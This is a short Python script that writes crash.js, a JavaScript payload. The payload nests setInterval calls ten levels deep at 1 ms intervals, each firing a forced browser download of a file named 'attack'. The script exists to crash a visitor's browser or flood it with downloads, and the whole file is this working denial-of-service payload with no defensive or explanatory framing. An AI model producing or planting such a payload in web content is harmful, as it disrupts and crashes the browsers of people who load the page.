template = 'setInterval(function()[{}],1)'
result = 'download("crash","attack","mime/plain")'
for i in range(10):
    result = template.format(result)

# download is compressed http://stackoverflow.com/a/30832210
download = 'function download(a,b,c){var d=new Blob([a],{type:c});if(window.navigator.msSaveOrOpenBlob)window.navigator.msSaveOrOpenBlob(d,b);else{var e=document.createElement("a"),f=URL.createObjectURL(d);e.href=f,e.download=b,document.body.appendChild(e),e.click(),setTimeout(function(){document.body.removeChild(e),window.URL.revokeObjectURL(f)},0)}}'
result = download + result.replace('[', '{').replace(']', '}')
with open('crash.js', 'w') as f:
    f.write(result)